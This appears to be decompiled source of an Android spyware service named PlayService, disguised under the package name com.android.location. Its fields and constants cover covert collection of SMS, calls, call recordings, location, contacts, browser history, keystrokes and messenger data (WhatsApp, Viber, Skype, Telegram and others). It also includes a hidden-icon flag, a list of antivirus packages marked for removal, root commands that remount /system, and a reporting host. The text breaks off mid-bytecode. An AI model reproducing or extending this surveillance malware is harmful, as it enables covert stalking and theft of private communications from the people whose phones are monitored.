package com.android.location;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.ActivityManager;
import android.app.ActivityManager.RunningAppProcessInfo;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.ContentProviderOperation;
import android.content.ContentProviderOperation.Builder;
import android.content.ContentProviderResult;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.res.AssetManager;
import android.content.res.Resources;
import android.database.ContentObserver;
import android.database.Cursor;
import android.database.SQLException;
import android.database.sqlite.SQLiteDatabase;
import android.media.AudioRecord;
import android.media.MediaPlayer;
import android.media.MediaRecorder;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.NetworkInfo.State;
import android.net.Uri;
import android.net.sip.SipAudioCall;
import android.net.sip.SipAudioCall.Listener;
import android.net.sip.SipManager;
import android.net.sip.SipProfile;
import android.net.sip.SipProfile.Builder;
import android.net.sip.SipRegistrationListener;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Build.VERSION;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.Message;
import android.os.PowerManager;
import android.os.PowerManager.WakeLock;
import android.os.StatFs;
import android.os.SystemClock;
import android.provider.Browser;
import android.provider.CallLog.Calls;
import android.provider.ContactsContract.CommonDataKinds.Phone;
import android.provider.ContactsContract.Contacts;
import android.provider.ContactsContract.RawContacts;
import android.provider.MediaStore.Images.Media;
import android.provider.MediaStore.Video.Media;
import android.provider.Settings.Secure;
import android.telephony.PhoneStateListener;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.telephony.gsm.GsmCellLocation;
import android.text.format.Time;
import android.util.Log;
import com.android.internal.telephony.ITelephony;
import com.uraroji.garage.android.mp3recvoice.RecMicToMp3;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileDescriptor;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.net.URI;
import java.net.UnknownHostException;
import java.nio.ByteBuffer;
import java.nio.channels.FileChannel;
import java.nio.channels.SocketChannel;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Calendar;
import java.util.Enumeration;
import java.util.Iterator;
import java.util.LinkedList;
import java.util.List;
import java.util.Random;
import java.util.UUID;
import java.util.zip.GZIPOutputStream;
import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import ru.dtlbox.databasereader.ChromeHistoryReader;
import ru.dtlbox.databasereader.Config;
import ru.dtlbox.databasereader.Config.Builder;
import ru.dtlbox.databasereader.FirefoxHistoryReader;
import ru.dtlbox.databasereader.OperaHistoryReader;
import ru.dtlbox.databasereader.OperaMiniHistoryReader;
import ru.dtlbox.databasereader.SkypeReader;
import ru.dtlbox.databasereader.ViberReader;
import ru.dtlbox.databasereader.WhatsAppReader;
import ru.mobile.protector.BackupData;
import ru.mobile.protector.CameraActivity;
import ru.mobile.protector.LbsInfo;
import ru.mobile.protector.LbsLocationListener;
import ru.mobile.protector.SMSReceiver;
import ru.mobile.protector.SMSReceiver.ScreenRecorder;
import ru.mobile.protector.SMSReceiver.StringTrike;
import ru.mobile.protector.SmsProvider;
import ru.mobile.protector.UniProvider;
import ru.mobile.protector.WifiAndCellCollector;
import ru.mobile.protector.WifiAndCellCollector.CCidLacTime;

public class PlayService
  extends Service
  implements LbsLocationListener
{
  public static final int BATMENT = 5;
  public static byte CAN = 0;
  public static final int CELLCONTROL = 1;
  public static final String DATE_FORMAT_NOW = "yyyyMMddHHmmss";
  public static final int DEMO = 6;
  public static final int D_AGENT_ATTACH = 13;
  public static final int D_EMAIL_ATTACH = 6;
  public static final int D_FACEBOOK_ATTACH = 9;
  public static final int D_FOLDER_ATTACH = 7;
  public static final int D_GMAIL_ATTACH = 1;
  public static final int D_INSTAGRAM_ATTACH = 8;
  public static final int D_OK_ATTACH = 12;
  public static final int D_SKYPE_ATTACH = 5;
  public static final int D_TELEGRAM_ATTACH = 10;
  public static final int D_UNKNOWN_ATTACH = 2;
  public static final int D_VIBER_ATTACH = 3;
  public static final int D_VK_ATTACH = 11;
  public static final int D_WHATSAPP_ATTACH = 4;
  public static final int EDUARD = 2;
  public static final int EGOR = 3;
  public static boolean GOOGLEPLAY = false;
  public static StringBuffer GlobalLog;
  public static boolean LOGCAT = false;
  public static final int MAX_GROUP_FILES_PER_TIME = 20;
  static final int MAX_LOGS_COUNT = 5;
  static final int MAX_LOG_FILE_SIZE = 1048576;
  private static final int MAX_TCP_LOG_LEN = 30000;
  private static final int MAX_VIDEO_FILE_SIZE = 20971520;
  private static String MESSAGEDIGEST_ALGORITHM;
  public static String MY_PACKAGE_NAME;
  public static byte NECAN = 0;
  public static final String PREFERENCES = "backupPrefs";
  static final int PREVENTION_VALUE = 50;
  public static String Port;
  public static boolean ROOTED = false;
  public static final int SHADOWCOPY = 0;
  public static final String SHORT_DATE_FORMAT_NOW = "ddHHmm";
  static final int SKIP_VALUE = 5;
  public static String SMSServer;
  public static String SMSServerList;
  public static int SOFT_VERSION = 0;
  static final int START = 1;
  static final int STOP = 2;
  public static String SU;
  public static String Server;
  public static String ServerList;
  private static final String TAG = "backup.service";
  private static final String TAG2 = "backup.service.wifi";
  public static final int TEST = 4;
  static final int TR_ALWAYS = 0;
  static final int TR_CHARGE = 2;
  static final int TR_WIFI = 1;
  static final int TR_WIFI_CHARGE = 3;
  static final int U_AGENT = 262144;
  static final int U_ATTACH = 16384;
  static final int U_AUDIO = 4;
  static final int U_BROWSER = 2048;
  static final int U_CALENDAR = 1024;
  static final int U_CALL = 2;
  static final int U_CALLREC = 32768;
  static final int U_EMAIL = 65536;
  static final int U_EVENT = 8192;
  static final int U_FACEBOOK = 16777216;
  static final int U_FOLDER = 4194304;
  static final int U_GEO = 16;
  static final int U_GMAIL = 512;
  static final int U_INSTAGRAM = 8388608;
  static final int U_KBRD = 33554432;
  static final int U_OK = 2097152;
  static final int U_PHONEBOOK = 8;
  static final int U_PHOTO = 4096;
  static final int U_SKYPE = 64;
  static final int U_SMS = 1;
  static final int U_SOFT = 32;
  static final int U_TELEGRAM = 1048576;
  static final int U_VIBER = 256;
  static final int U_VIDEO = 131072;
  static final int U_VK = 524288;
  static final int U_WHATS_APP = 128;
  public static String VOIPRecorderOutputFile = "";
  public static boolean bAlreadyRedRunning = false;
  static boolean bAlreadyStarted = false;
  public static boolean bAntivirusListChanged = false;
  public static byte bCanSu = 0;
  public static boolean bForce3G = false;
  public static boolean bForceWIFI = false;
  private static boolean bIconHidden = false;
  static boolean bInitialized = false;
  public static boolean bKnockOffScreenOnly = false;
  public static boolean bLoadPictures = false;
  public static boolean bNeedUpdateBDCounter = false;
  public static boolean bNeedUpdateChromeCounter = false;
  public static boolean bNeedUpdateFirefoxCounter = false;
  public static boolean bNeedUpdateOperaCounter = false;
  public static boolean bNeedUpdateOperaMiniCounter = false;
  public static boolean bNeedUpdateWABDCounter = false;
  public static boolean bRebootMe = false;
  public static boolean bRecordAdmin = false;
  public static boolean bRecordCalls = false;
  public static boolean bRecordUnknownOnly = false;
  public static boolean bRemoveAntivirus = false;
  public static boolean bReportSimChange = false;
  public static boolean bResetCalendar = false;
  public static boolean bResetGmail = false;
  public static boolean bResetSkype = false;
  public static boolean bResetSkypeAttach = false;
  public static boolean bSMSAdmin = false;
  public static boolean bScreenActive = false;
  public static boolean bSendLog = false;
  public static volatile boolean bServiceStarted = false;
  public static boolean bSkipOneRootDisable = false;
  public static boolean bUninstallMe = false;
  public static boolean bUploadGmailAttach = false;
  public static boolean bUseAutoCallRec = false;
  public static boolean bUseBlocking = false;
  public static boolean bUseLame = false;
  public static boolean bUseMacForID = false;
  public static boolean bUseRepeatControl = false;
  public static boolean bUseWakeLock = false;
  public static boolean bWork = false;
  public static Context context = null;
  public static String dataPath;
  public static String filesPath;
  public static int iAllLogPORT = 0;
  public static long iAudioCallSaved = 0L;
  public static int iAudioFormat = 0;
  public static int iAudioSource = 0;
  public static int iBitRate = 0;
  public static long iBufferSize = 0L;
  public static int iCallAnswerEvent = 0;
  public static int iCallEncoder = 0;
  public static volatile int iCallRecordState = 0;
  public static int iChargingNow = 0;
  public static int iChromeCounter = 0;
  public static int iConfig = 0;
  public static long iDaysLeft = 0L;
  public static byte iDropSendPacket = 0;
  public static int iFirefoxCounter = 0;
  public static int iForceGPS = 0;
  public static int iGPSCheckInterval = 0;
  public static int iGPSTimeout = 0;
  public static long iLastExtPictureRed = 0L;
  public static long iLastExtVideoRed = 0L;
  public static long iLastIntPictureRed = 0L;
  public static long iLastIntVideoRed = 0L;
  public static long iLastMMSIDServer = 0L;
  public static long iLastPhoneBookIDServer = 0L;
  public static long iLastUploadTime = 0L;
  public static int iMaxAudioListenFile = 0;
  public static int iOldPickup = 0;
  public static int iOutDBRefreshRate = 0;
  public static int iPauseBeforeCallRecord = 0;
  public static int iPickup = 0;
  public static int iPort_ID = 0;
  public static int iPreventChrome = 0;
  public static int iPreventFirefox = 0;
  public static int iPreventOpera = 0;
  public static int iPreventOperaMini = 0;
  public static int iPreventReadAgent = 0;
  public static int iPreventReadFB = 0;
  public static int iPreventReadOK = 0;
  public static int iPreventReadTG = 0;
  public static int iPreventReadViberAtt = 0;
  public static int iPreventReadWAAtt = 0;
  public static int iReadSMSInterval = 0;
  public static int iRecAfterCall = 0;
  public static long iSMSQueryInterval = 0L;
  public static int iSMSServer_ID = 0;
  public static int iSamplingRate = 0;
  public static int iServer_ID = 0;
  public static int iTransfer = 0;
  public static int iTransferBinary = 0;
  public static int iTransferBinaryUnlim = 0;
  public static int iUDPPort = 0;
  public static int iUploadInterval = 0;
  public static int iWifiOnOff = 0;
  static volatile boolean isLock = false;
  public static long lAgentAttCounter = 0L;
  public static long lAgentCount = 0L;
  public static long lFBAttCounter = 0L;
  public static long lFBCounter = 0L;
  public static long lLastBrowserHistoryID = 0L;
  public static long lLastCallListIDServer = 0L;
  public static long lLastInstagram = 0L;
  public static long lLastSMSRed = 0L;
  public static long lOKAttCounter = 0L;
  public static long lOKCounter = 0L;
  public static long lOperaCounter = 0L;
  public static long lOperaMiniCounter = 0L;
  public static long lSyncFolderLastTime = 0L;
  public static long lTGAttCounter = 0L;
  public static long lTGCounter = 0L;
  public static long lVKCounter = 0L;
  public static int lViberAttCounter = 0;
  public static long lViberCounter = 0L;
  public static int lWAAttCounter = 0;
  public static long lWhatsAppCounter = 0L;
  public static long mLastBrowser44 = 0L;
  static SharedPreferences mSettings;
  private static Config megaconfig;
  static final int myID = 1234;
  static File mydir;
  public static MediaRecorder recorder = null;
  public static PlayService ref;
  public static Resources res = null;
  public static String sAdminNumber;
  public static String sAnswerList;
  public static String sAntivirusList;
  public static final String sAudioPacket = "myaudio";
  public static String sBLockIPList;
  public static String sBlockSMSList;
  public static String sCallBlockList;
  public static String sHost;
  public static String sIMEI;
  public static String sLicense;
  public static String sListToKill;
  private static String sLogFileName;
  private static String sLogFileName1;
  public static String sMAC;
  public static String sMakeCall;
  public static final String sPacket = "mydata";
  public static String sRecBlackList;
  public static String sRecWhiteList;
  public static volatile String sSMSLOG;
  public static String sSimID;
  public static String sSyncFolder;
  public static final String sTempPacket = "temppacket";
  public static String sViberPath;
  public static volatile String sWEBLOG;
  public static String sWhatsAppPath;
  private static int udp_id;
  final byte AGENT_MES_ID = 7;
  final byte ATTACH_PACKET = 99;
  final byte ATTACH_SKYPE = 98;
  final byte AUDIO_LISTEN_PACKET = 108;
  final byte AUDIO_PACKET = 105;
  final byte BROWSERHISTORY = 114;
  final byte CALENDAR_PACKET = 122;
  final byte CALL_PACKET = 102;
  final int CANNOT_CREATE_UPLOAD_PACKET = 2;
  int CUSTOMER_ID = 0;
  final byte EMAIL_PACKET = 100;
  final byte END_OF_BLOCK = 2;
  final byte END_OF_FIELD = 1;
  final byte END_OF_LINE = 3;
  final int ERROR_CREATING_PACKET = 5;
  final byte EVENT_PACKET = 123;
  final byte FACEBOOK_MES_ID = 11;
  final byte FILE_PACKET = 125;
  final byte GEO_INFO = 104;
  final String GET_CALL_ID = "1";
  final byte GLOBALLOG = 113;
  final byte GMAIL_PACKET = 121;
  final byte IMESSAGE_MES_ID = 6;
  final byte IMESSAGE_PACKET = 124;
  Class ITelephonyClass;
  Object ITelephonyStub;
  final byte KEYBOARD_PACKET = 95;
  public int MAX_AUDIO_PACKET = 2097152;
  final byte MMS_MES_ID = 2;
  final byte MMS_PACKET = 106;
  final byte NEW_AUDIO_LISTEN_PACKET = 118;
  final byte NEW_VIBER_PACKET = 126;
  final int NO_CONNECTION = 3;
  final int NO_SIUTABLE_STORAGE_PLACE = 1;
  final int OK = 0;
  final byte OK_MES_ID = 10;
  final int OK_UPLOAD = 4;
  final byte PHONE_PACKET = 103;
  final byte PICTURE_PACKET = 115;
  final int PROTOCOL_VERSION = 7;
  final byte PSLIST_PACKET = 96;
  final byte RUNNING_PACKET = 120;
  final byte RUNNING_PACKET2 = Byte.MAX_VALUE;
  public volatile boolean Running = false;
  final byte SKYPE_MES_ID = 5;
  final byte SKYPE_PACKET = 119;
  final byte SMSLOG = 110;
  final byte SMS_MES_ID = 1;
  final byte SMS_PACKET = 101;
  final byte SMS_QUESTION = 109;
  public int SOCKET_READ_TIMEOUT = 60000;
  final byte STATUSTEXT = 112;
  final byte TG_MES_ID = 9;
  final byte UNITEXT_PACKET = 97;
  final int UNKNOWN_PHONE = 9;
  final byte VIBER_MES_ID = 4;
  final byte VIBER_PACKET = 117;
  final byte VIDEO_PACKET = 107;
  final byte VK_MES_ID = 8;
  final byte WEBLOG = 111;
  final byte WHATSAPP_MES_ID = 3;
  final byte WHATSAPP_PACKET = 116;
  private ArrayList<String> _Ids = new ArrayList();
  AudioRecord arecorder = null;
  boolean bCanResetCounter = false;
  private boolean bCanUseSQLITE = false;
  private boolean bIsRootInstall = false;
  boolean bRunNotFirstTime = false;
  private boolean bSkypeUsersRed = false;
  Intent batteryStatus;
  public BroadcastReceiver brMedia = null;
  public SMSReceiver brSMSReceiver = null;
  public BroadcastReceiver brScreen = null;
  int bufferSize = 0;
  public SipAudioCall call = null;
  PlayService class_copy;
  Uri contacts;
  public LbsInfo curInfo = null;
  Method dataConnSwitchmethod_OFF;
  Method dataConnSwitchmethod_ON;
  FileOutputStream fileOut = null;
  private IntentFilter filter2;
  private int iAgentRed = 0;
  int iBatteryState = 0;
  int iBatteryTemp = 0;
  int iBatteryVoltage = 0;
  int iImeiFindCounter = 0;
  private long iKnock = 0L;
  int iMacFindCounter = 0;
  private final int iMaxEmails = 50;
  public volatile int iSIM1SignalStrengh = 0;
  public int iSIM1SignalStrenghFlash = 1;
  public volatile int iVOIPRecordState = 0;
  long lCallListCounter = 0L;
  long lLastSendTime = 0L;
  private LinkedList<String> lSMSQueries = new LinkedList();
  long lSmsReaderCounter = 0L;
  long lUploadCounter = 0L;
  public int lastCid = 0;
  public LbsInfo lastInfo = null;
  public int lastLac = 0;
  public int lastMcc = 0;
  public int lastMnc = 0;
  PhoneStateListener listener = null;
  public volatile ArrayList<LbsInfo> locationHistory = null;
  public boolean locationHistoryLocked = true;
  Process logcat = null;
  private BroadcastReceiver mBatInfoReceiver = new BroadcastReceiver()
  {
    public void onReceive(Context paramAnonymousContext, Intent paramAnonymousIntent)
    {
      if (paramAnonymousIntent == null)
      {
        PlayService.FLOG("intent is null");
        return;
      }
      try
      {
        if (paramAnonymousIntent.getAction() == null)
        {
          PlayService.FLOG("intent.getAction() is null");
          return;
        }
      }
      catch (Exception paramAnonymousContext)
      {
        PlayService.EXCEPT(paramAnonymousContext, "BatStateListener DIED");
        return;
      }
      if (paramAnonymousIntent.getAction().equals("android.intent.action.BATTERY_CHANGED"))
      {
        PlayService.this.iBatteryState = paramAnonymousIntent.getIntExtra("level", 0);
        PlayService.this.iBatteryVoltage = paramAnonymousIntent.getIntExtra("voltage", 0);
        PlayService.this.iBatteryTemp = paramAnonymousIntent.getIntExtra("temperature", 0);
        if (paramAnonymousIntent.getIntExtra("plugged", 0) > 0)
        {
          if (PlayService.iChargingNow != 1) {
            PlayService.putEvent(PlayService.res.getString(2130968584));
          }
          PlayService.iChargingNow = 1;
          return;
        }
        if (PlayService.iChargingNow != 2) {
          PlayService.putEvent(PlayService.res.getString(2130968585));
        }
        PlayService.iChargingNow = 2;
        return;
      }
      PlayService.FLOG(paramAnonymousIntent.getAction());
      if (paramAnonymousIntent.getAction().equals("android.intent.action.ACTION_POWER_CONNECTED"))
      {
        PlayService.FLOG("Charger plugged in, was = " + PlayService.iChargingNow);
        PlayService.iChargingNow = 1;
        PlayService.FLOG("Charger state now = " + PlayService.iChargingNow);
        PlayService.putEvent(PlayService.res.getString(2130968584));
      }
      for (;;)
      {
        PlayService.FLOG("iChargingNow=" + PlayService.iChargingNow);
        return;
        if (paramAnonymousIntent.getAction().equals("android.intent.action.ACTION_POWER_DISCONNECTED"))
        {
          PlayService.iChargingNow = 2;
          PlayService.FLOG("Charger state now = " + PlayService.iChargingNow);
          PlayService.putEvent(PlayService.res.getString(2130968585));
        }
      }
    }
  };
  ChromeHistoryReader mChromeHistoryReader = null;
  FirefoxHistoryReader mFirefoxHistoryReader = null;
  OperaHistoryReader mOperaHistoryReader = null;
  OperaMiniHistoryReader mOperaMiniHistoryReader = null;
  private BroadcastReceiver mPackageAddedReceiver = null;
  MediaPlayer mPlayer = null;
  private RecMicToMp3 mRecMicToMp3 = null;
  private BroadcastReceiver mUploaderStartReceiver = null;
  ViberReader mViberReader = null;
  WhatsAppReader mWhatsAppReader = null;
  private BroadcastReceiver mWifiStateReceiver = new BroadcastReceiver()
  {
    public void onReceive(Context paramAnonymousContext, Intent paramAnonymousIntent)
    {
      PlayService.FLOG("WIFI EVENT");
      if (paramAnonymousIntent == null)
      {
        PlayService.FLOG("intent is null");
        return;
      }
      try
      {
        paramAnonymousContext = paramAnonymousIntent.getAction();
        if (!paramAnonymousContext.equals("android.net.wifi.supplicant.CONNECTION_CHANGE")) {
          break label89;
        }
        if (paramAnonymousIntent.getBooleanExtra("connected", false))
        {
          PlayService.FLOG("WIFI CONNECTED");
          PlayService.iWifiOnOff = 1;
          PlayService.putEvent(PlayService.res.getString(2130968582));
          return;
        }
      }
      catch (Exception paramAnonymousContext)
      {
        PlayService.EXCEPT(paramAnonymousContext, "WifiStateListener DIED");
        return;
      }
      PlayService.FLOG("WIFI disCONNECTED");
      PlayService.putEvent(PlayService.res.getString(2130968583));
      PlayService.iWifiOnOff = 2;
      return;
      label89:
      paramAnonymousIntent = (NetworkInfo)paramAnonymousIntent.getParcelableExtra("networkInfo");
      if (paramAnonymousIntent != null)
      {
        if (paramAnonymousIntent.isConnected())
        {
          PlayService.FLOG("WIFI CONNECTED due to info Wifi");
          PlayService.iWifiOnOff = 1;
          PlayService.putEvent(PlayService.res.getString(2130968582));
          return;
        }
        PlayService.FLOG("Wifi IS NOT connected due to info");
        PlayService.putEvent(PlayService.res.getString(2130968583));
        PlayService.iWifiOnOff = 2;
        return;
      }
      PlayService.FLOG("network info is null!!");
      PlayService.FLOG("wifi.action = " + paramAnonymousContext);
    }
  };
  SipProfile me = null;
  private ArrayList<String> messageIds = new ArrayList();
  public String myName = "Unknown";
  Random rand;
  Thread recordingThread = null;
  public volatile String rejected = "";
  public String sAudioFilename = "";
  public String sFileToUpload = "";
  SocketChannel sch = null;
  public String sipAddress = "@sip.zadarma.com";
  SipManager sipManager = null;
  TelephonyManager telephonyManager = null;
  Class telephonyManagerClass;
  ITelephony telephonyService;
  public LogAnalyzer thAnalyzer = null;
  public Installer thInstaller = null;
  public SMSCopier thSMSCopier = null;
  public Updater thUpdater = null;
  public Uploader thUploader = null;
  private volatile ArrayList<SkypeReader> userListSkype = null;
  private VideoRecorder videorecorder = null;
  public WifiAndCellCollector wifiAndCellCollector;
  
  static
  {
    bAntivirusListChanged = false;
    megaconfig = null;
    mydir = null;
    SU = "su";
    iCallRecordState = 0;
    bAlreadyStarted = false;
    sMakeCall = "";
    sListToKill = "";
    bAlreadyRedRunning = false;
    CAN = 0;
    NECAN = 1;
    bCanSu = 5;
    ref = null;
    bScreenActive = true;
    bInitialized = false;
    bRebootMe = false;
    bUninstallMe = false;
    bResetSkype = false;
    bResetSkypeAttach = false;
    bResetGmail = false;
    bResetCalendar = false;
    lVKCounter = 0L;
    lTGCounter = 0L;
    lFBCounter = 0L;
    lOKCounter = 0L;
    lViberCounter = 0L;
    lAgentCount = 0L;
    lViberAttCounter = 0;
    bNeedUpdateBDCounter = true;
    lWAAttCounter = 0;
    lTGAttCounter = 0L;
    lFBAttCounter = 0L;
    lAgentAttCounter = 0L;
    lOKAttCounter = 0L;
    bNeedUpdateWABDCounter = true;
    lSyncFolderLastTime = 0L;
    lLastSMSRed = 0L;
    lLastCallListIDServer = 0L;
    lLastBrowserHistoryID = 0L;
    mLastBrowser44 = 0L;
    iLastPhoneBookIDServer = 0L;
    iLastUploadTime = 0L;
    iLastIntPictureRed = 0L;
    iLastExtPictureRed = 0L;
    iLastIntVideoRed = 0L;
    iLastExtVideoRed = 0L;
    lLastInstagram = 0L;
    lWhatsAppCounter = 0L;
    lOperaCounter = 0L;
    bNeedUpdateOperaCounter = false;
    lOperaMiniCounter = 0L;
    bNeedUpdateOperaMiniCounter = false;
    iChromeCounter = 0;
    bNeedUpdateChromeCounter = false;
    iFirefoxCounter = 0;
    bNeedUpdateFirefoxCounter = false;
    iPreventFirefox = 0;
    iPreventChrome = 0;
    iPreventOperaMini = 0;
    iPreventOpera = 0;
    iPreventReadWAAtt = 0;
    iPreventReadViberAtt = 0;
    iPreventReadTG = 0;
    iPreventReadFB = 0;
    iPreventReadAgent = 0;
    iPreventReadOK = 0;
    iAudioCallSaved = 0L;
    bIconHidden = false;
    bUseAutoCallRec = true;
    iGPSTimeout = 300;
    iOutDBRefreshRate = 5;
    bUseRepeatControl = false;
    iMaxAudioListenFile = 524288;
    iPauseBeforeCallRecord = 0;
    iCallAnswerEvent = 0;
    iLastMMSIDServer = 0L;
    sWhatsAppPath = "";
    sViberPath = "";
    sSyncFolder = "";
    iDaysLeft = 100L;
    iDropSendPacket = 0;
    iBufferSize = 4096L;
    iSMSQueryInterval = 3000L;
    iGPSCheckInterval = 10;
    iAudioSource = 1;
    iAudioFormat = 1;
    iCallEncoder = 1;
    iBitRate = 0;
    iSamplingRate = 0;
    bUseLame = false;
    bRemoveAntivirus = false;
    sAntivirusList = "com.cleanmaster.security,com.avast,com.drweb, com.symantec,com.comodo, com.kms.,com.wsandroid.suite, com.avira.,com.sec.android.fwupgrade,com.google.sync,com.qihoo.security";
    iRecAfterCall = 0;
    iTransfer = 0;
    iTransferBinary = 0;
    iTransferBinaryUnlim = 1;
    iChargingNow = 0;
    iWifiOnOff = 0;
    bUploadGmailAttach = true;
    Server = "";
    iServer_ID = 0;
    ServerList = "";
    SMSServer = "";
    iSMSServer_ID = 0;
    SMSServerList = "";
    Port = "";
    iPort_ID = 0;
    sBLockIPList = "";
    sAnswerList = "";
    sAdminNumber = "";
    sSimID = "";
    sBlockSMSList = "";
    sCallBlockList = "";
    iUploadInterval = 1;
    bUseWakeLock = false;
    bSkipOneRootDisable = false;
    bRecordAdmin = true;
    bSMSAdmin = true;
    bSendLog = false;
    bUseBlocking = false;
    bRecordCalls = true;
    bReportSimChange = false;
    bWork = true;
    bRecordUnknownOnly = false;
    sRecWhiteList = "";
    sRecBlackList = "";
    bLoadPictures = true;
    bKnockOffScreenOnly = false;
    bForce3G = false;
    bForceWIFI = false;
    iForceGPS = 0;
    iUDPPort = 0;
    iAllLogPORT = 0;
    iReadSMSInterval = 2;
    sLicense = "0000";
    sSMSLOG = "";
    sWEBLOG = "";
    sIMEI = "";
    sMAC = "";
    bUseMacForID = false;
    iPickup = 62696895;
    iOldPickup = 0;
    sHost = "shadowcopy.ru";
    MY_PACKAGE_NAME = "com.android.location";
    dataPath = "/data/data/" + MY_PACKAGE_NAME;
    filesPath = "/data/data/" + MY_PACKAGE_NAME + "/files";
    LOGCAT = true;
    ROOTED = true;
    GOOGLEPLAY = false;
    iConfig = 0;
    GlobalLog = new StringBuffer();
    bServiceStarted = false;
    SOFT_VERSION = 0;
    sLogFileName = "mylog";
    sLogFileName1 = "mylogigi";
    udp_id = 0;
    MESSAGEDIGEST_ALGORITHM = "MD5";
    isLock = false;
  }
  
  public PlayService() {}
  
  private boolean CanMORE(FileOutputStream paramFileOutputStream)
  {
    if (paramFileOutputStream == null) {
      return false;
    }
    try
    {
      if (paramFileOutputStream.getChannel().size() < this.MAX_AUDIO_PACKET) {
        return true;
      }
      FLOG("NO MORE ROOM for AUDIODATA");
      return false;
    }
    catch (Exception paramFileOutputStream) {}
    return false;
  }
  
  public static void ChmodMeRun()
  {
    commandSU("mount -o remount,rw -t yaffs2 /dev/block/mtdblk3 /system && chmod 666 /system/app/Shadow.apk");
  }
  
  public static void ClearDB(Context paramContext)
  {
    paramContext.getContentResolver().delete(BackupData.CONTENT_URI, null, null);
    FLOG("Cleared, boss...");
  }
  
  private void CopySU(String paramString1, String paramString2)
  {
    File localFile = new File(paramString1);
    FLOG("WASource:" + localFile.exists() + ":" + localFile.canRead());
    commandSU("cat " + paramString1 + " > " + paramString2);
  }
  
  /* Error */
  public static void DEBUGLOG(String paramString)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore 7
    //   3: aconst_null
    //   4: astore 10
    //   6: aconst_null
    //   7: astore 8
    //   9: aconst_null
    //   10: astore 5
    //   12: aconst_null
    //   13: astore 11
    //   15: aconst_null
    //   16: astore 6
    //   18: aconst_null
    //   19: astore 9
    //   21: aload 10
    //   23: astore_2
    //   24: aload 11
    //   26: astore_3
    //   27: new 1250	java/io/File
    //   30: dup
    //   31: new 864	java/lang/StringBuilder
    //   34: dup
    //   35: ldc_w 1274
    //   38: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   41: getstatic 906	com/android/location/PlayService:sLogFileName	Ljava/lang/String;
    //   44: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   47: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   50: invokespecial 1251	java/io/File:<init>	(Ljava/lang/String;)V
    //   53: astore_1
    //   54: aload_1
    //   55: ifnull +44 -> 99
    //   58: aload 10
    //   60: astore_2
    //   61: aload 11
    //   63: astore_3
    //   64: aload_1
    //   65: invokevirtual 1257	java/io/File:exists	()Z
    //   68: ifeq +31 -> 99
    //   71: aload 10
    //   73: astore_2
    //   74: aload 11
    //   76: astore_3
    //   77: aload_1
    //   78: invokevirtual 1277	java/io/File:length	()J
    //   81: ldc2_w 1278
    //   84: lcmp
    //   85: ifle +14 -> 99
    //   88: aload 10
    //   90: astore_2
    //   91: aload 11
    //   93: astore_3
    //   94: aload_1
    //   95: invokevirtual 1281	java/io/File:delete	()Z
    //   98: pop
    //   99: aload 10
    //   101: astore_2
    //   102: aload 11
    //   104: astore_3
    //   105: new 1250	java/io/File
    //   108: dup
    //   109: new 864	java/lang/StringBuilder
    //   112: dup
    //   113: ldc_w 1274
    //   116: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   119: getstatic 906	com/android/location/PlayService:sLogFileName	Ljava/lang/String;
    //   122: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   125: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   128: invokespecial 1251	java/io/File:<init>	(Ljava/lang/String;)V
    //   131: astore 12
    //   133: aload 8
    //   135: astore 4
    //   137: aload 9
    //   139: astore_1
    //   140: aload 12
    //   142: ifnull +117 -> 259
    //   145: aload 8
    //   147: astore 4
    //   149: aload 9
    //   151: astore_1
    //   152: aload 10
    //   154: astore_2
    //   155: aload 11
    //   157: astore_3
    //   158: aload 12
    //   160: invokevirtual 1284	java/io/File:canWrite	()Z
    //   163: ifeq +96 -> 259
    //   166: aload 10
    //   168: astore_2
    //   169: aload 11
    //   171: astore_3
    //   172: new 1203	java/io/FileOutputStream
    //   175: dup
    //   176: aload 12
    //   178: invokespecial 1287	java/io/FileOutputStream:<init>	(Ljava/io/File;)V
    //   181: astore_1
    //   182: new 1289	java/io/FileWriter
    //   185: dup
    //   186: aload_1
    //   187: invokevirtual 1293	java/io/FileOutputStream:getFD	()Ljava/io/FileDescriptor;
    //   190: invokespecial 1296	java/io/FileWriter:<init>	(Ljava/io/FileDescriptor;)V
    //   193: astore_2
    //   194: aload_2
    //   195: ifnull +201 -> 396
    //   198: new 1298	java/io/BufferedWriter
    //   201: dup
    //   202: aload_2
    //   203: sipush 1024
    //   206: invokespecial 1301	java/io/BufferedWriter:<init>	(Ljava/io/Writer;I)V
    //   209: astore_3
    //   210: aload_3
    //   211: ifnull +185 -> 396
    //   214: aload_3
    //   215: new 864	java/lang/StringBuilder
    //   218: dup
